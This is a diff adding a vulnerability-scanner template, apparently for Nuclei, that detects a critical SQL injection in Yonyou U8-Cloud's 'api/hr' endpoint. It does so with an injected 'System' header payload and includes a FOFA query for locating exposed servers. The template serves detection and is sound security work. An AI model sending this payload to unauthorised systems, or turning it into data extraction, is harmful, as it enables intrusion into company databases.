@@ -1,0 +1,31 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - status_code==200
+    - contains(body, "{{str1}}1{{str2}}")
+    type: dsl
+  raw:
+  - 'GET /u8cloud/api/hr HTTP/1.1
+
+    Host: {{Hostname}}
+
+    System: 1'' AND 1156 IN (SELECT ''{{str1}}'' + ''1'' + ''{{str2}}'')--
+
+    '
+id: yonyou-u8-cloud-api-hr-sqli
+info:
+  author: Co5mos
+  description: "\u7528\u53CB U8-cloud `api/hr` \u63A5\u53E3\u5B58\u5728SQL\u6CE8\u5165\
+    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\
+    \u53D6\u670D\u52A1\u5668\u6570\u636E\u5E93\u6743\u9650\u3002U8 cloud\u96C6\u4E2D\
+    \u4E8E\u4F01\u4E1A\u5185\u90E8\u7BA1\u7406\u7BA1\u63A7\uFF0C\u7BA1\u7406\u89C4\
+    \u8303\uFF0C\u9AD8\u6548\uFF0C\u534F\u540C\uFF0C\u900F\u660E\u3002\n"
+  metadata:
+    fofa-query: "app=\"\u7528\u53CB-U8-Cloud\""
+  name: U8-Cloud API HR SQL Injection
+  severity: critical
+  tags: sqli, u8cloud, yonyou
+variables:
+  str1: '{{randstr}}'
+  str2: '{{randstr}}'
